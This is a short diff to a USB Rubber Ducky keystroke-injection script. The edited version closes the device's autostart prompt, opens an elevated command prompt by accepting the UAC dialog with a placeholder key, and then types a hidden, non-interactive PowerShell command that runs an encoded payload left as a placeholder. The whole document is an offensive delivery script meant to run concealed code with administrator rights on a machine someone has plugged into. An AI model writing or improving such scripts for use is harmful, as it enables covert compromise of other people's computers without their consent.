@@ -1,8 +1,19 @@
 DELAY 5000
-GUI r
+REM get rid of autostart message from storage of ducky
+ALT F4
+DELAY 500
+ESCAPE
+DELAY 500
+CONTROL ESCAPE
 DELAY 500
 STRING cmd
-ENTER
+DELAY 500
+CTRL-SHIFT ENTER
 DELAY 1000
+ALT <uac_bypass_key>
+DELAY 1500
+ENTER
+ENTER
+ENTER
 STRING powershell.exe -w hidden -noni -nop -enc <encpayload>
 ENTER
